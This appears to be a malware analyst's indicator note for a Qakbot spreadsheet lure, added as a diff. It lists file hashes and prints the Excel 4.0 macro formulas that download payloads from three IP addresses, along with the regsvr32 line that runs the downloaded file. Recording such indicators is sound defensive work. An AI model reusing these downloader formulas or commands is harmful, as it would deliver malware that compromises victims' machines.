@@ -1,0 +1,23 @@
+24.02.2022 | Qakbot | ?? | 
+
+.xls 6cc35c64d7f28ab60d23e7bd1d21928ee46aa8923f0a40bccb317e3b5a57353d
+.dll 5c9d833059550fba6ce9474cf0d23d07d79ffc99bedeac78a55d2271160b91af
+
+
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\a", 0)
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://185.81.113.214/44616.6382774305.dat", "C:\a\Gertiokas1.ocx")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://67.43.234.56/44616.6382774305.dat", "C:\a\Gertiokas2.ocx")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://23.106.124.9/44616.6382774305.dat", "C:\a\Gertiokas3.ocx")
+
+http://185.81.113.214/44616.6382774305.dat
+http://67.43.234.56/44616.6382774305.dat
+http://23.106.124.9/44616.6382774305.dat
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\1c7829f0316c7aeb94e0887bedf93e3667ab1283659bb1e3d5bcb2860d609ec1.xlsb
+
+regsvr32  C:\a\Gertiokas1.ocx
+
+*************************************************
+
